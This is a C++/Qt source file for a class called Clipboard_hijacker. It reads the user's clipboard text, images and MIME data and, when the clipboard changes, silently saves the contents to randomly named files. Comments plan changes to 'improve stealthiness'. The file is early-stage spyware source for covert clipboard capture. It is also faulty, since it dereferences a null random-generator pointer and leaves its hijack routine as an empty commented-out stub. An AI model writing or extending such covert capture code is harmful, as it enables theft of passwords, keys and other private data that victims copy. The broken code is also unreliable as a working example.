#include "clipboard_hijacker.h"
#include <QtWidgets>
#include <QApplication>
#include <QLabel>
#include <QDebug>
#include <QCryptographicHash>
#include <QRandomGenerator>


Clipboard_hijacker::Clipboard_hijacker()
{
        const QClipboard *clipboard = QApplication::clipboard();
        QString clipboardText = clipboard->text();
        //testing if it works
        if(clipboardText.isEmpty())
        {
           qDebug() << "Clipboard is empty!";
        }
        else
        {
           qDebug() << "Clipboard is not empty: " << clipboardText;
        }

}
/*
void Clipboard_hijacker::hijack(QClipboard *clipboard)
{
    const QMimeData *mimeData = clipboard->mimeData();
    QLabel labelforimages;


}
*/
void Clipboard_hijacker::clipboardChanged()
{
    QClipboard *clipchanged = QApplication::clipboard();
    QRandomGenerator *randomNumber=nullptr;
    QString filename = QString::number(randomNumber->generate());
    QFile file(filename);
    qDebug() << "entered";
    while(QFileInfo::exists(filename))
    {
        filename=QString::number(randomNumber->generate());
        qDebug() << "file exists"<< endl;
    }
    //From there, filename has to be unique, avoid colisions (here it's useless but implemented for maybe later use since we could rewrite data in the file)
    file.open(QIODevice::ReadWrite);
    QTextStream out(&file);
    out << clipchanged->text();
    return;
    //TODO use md5 to produce unique filename to avoid conflicts in filename, besides could avoid writing to filesystem to improve stealthiness)s
    //QByteArray hash = QCryptographicHash::hash(QClipboard::text(QClipboard::Clipboard).toLocal8bit(), QCryptographicHash::Md5);
     
}

QString Clipboard_hijacker::getclipboardString()
    {
        QClipboard *clip = QApplication::clipboard();
        return clip->text();
    }

QImage Clipboard_hijacker::getclipboardImage()
{
    QClipboard *clip = QApplication::clipboard();
    return clip->image();
}
const QMimeData* Clipboard_hijacker::getMimeData()
{
    QClipboard *clip = QApplication::clipboard();
    return clip->mimeData();
}
Clipboard_hijacker::~Clipboard_hijacker()
{

}
